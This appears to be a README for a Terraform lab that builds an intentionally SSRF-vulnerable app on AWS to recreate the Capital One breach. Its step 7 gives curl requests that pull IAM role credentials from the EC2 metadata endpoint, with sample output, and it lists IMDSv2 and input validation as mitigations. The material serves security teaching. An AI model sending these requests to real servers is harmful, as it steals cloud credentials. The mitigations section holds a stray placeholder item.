# SSRF vulnerablity demo
![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge&logo=amazon-aws&logoColor=white)![Terraform](https://img.shields.io/badge/terraform-%235835CC.svg?style=for-the-badge&logo=terraform&logoColor=white)

## Demo diagram 
![Diagram]()

## Purpose
Demonstrating a Server Side Request Forgery (SSRF) attack in AWS environment , similar to the [CapitalOne breach](https://www.capitalone.com/digital/facts2019/).
The environment will be deployed with Terraform IaC module.



## Prerequisites
* Active AWS account.
* AWS IAM user with AWS credential type: ["Access key - Programmatic access"](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html) and [AdministratorAccess](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html)

*  [Terraform installed](https://learn.hashicorp.com/tutorials/terraform/install-cli)
* Clone this repo to the environmnet which you run terraform from : 
```ShellSession
git clone https://github.com/ramibo/ssrf_aws_demo.git 
```

* Optional - In the following files ,set the paramters with your values :  
main.tf: `availability_zone` , `resource "aws_key_pair"{public_key}`  
providers.tf: `shared_config_files`,`shared_credentials_files` `profile` , `region`



## Running the demo

1. `cd` to the  `ssrf_aws_demo` directory.
2. Run `terraform init` command to prepare your working directory for next commands.
3. Run `terraform validate` command check whether the configuration is valid.
4. Run `terraform plan` command show changes required by the current configuration.
5. Run `terraform apply` / `terraform apply -auto-approve` to create / update the infrastructure at AWS
6. If there no errors from the prvious steps , from your terminal run the following:
__Important !__ - The `host` can be the created ec2 instance [Public IPv4 address / DNS ](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses).
```ShellSession
bash$ curl -s http://host:5000 
AWS SSRF IMDSv1 demo
```
7. The `/uptime` page is vulnerable to an SSRF attack, we will utilize the url parameter with the instance metadata URI --> retrieve the attached role --> extract the security credentials as following:
```ShellSession
bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
aws_ssrf_demo_iam_role
bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_ssrf_demo_iam_role
{
  "Code" : "Success",
  "LastUpdated" : "2022-12-20T20:56:29Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIASF",
  "SecretAccessKey" : "Id+zUu",
  "Token" : "IQoJb3JpZ2luX2VjEEUaCXVzLW",
  "Expiration" : "2022-12-21T03:31:14Z"
}
```

8. 
## Mitigation Steps

1. Enabling IMDS version 2 of the service

2. Fix the application by sanitize/validate all client-supplied input data.

3. dfgsd

## Refrences
* [FreeCodeCamp - Learn Terraform (and AWS) by Building a Dev Environment – Full Course for Beginners](https://www.youtube.com/watch?v=iRaai1IBlB0)
* [An SSRF, privileged AWS keys and the Capital One breach](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
* [How to hack AWS instances that have the metadata service (IMDSv1) enabled](https://alexanderhose.com/how-to-hack-aws-instances-with-the-metadata-service-enabled/)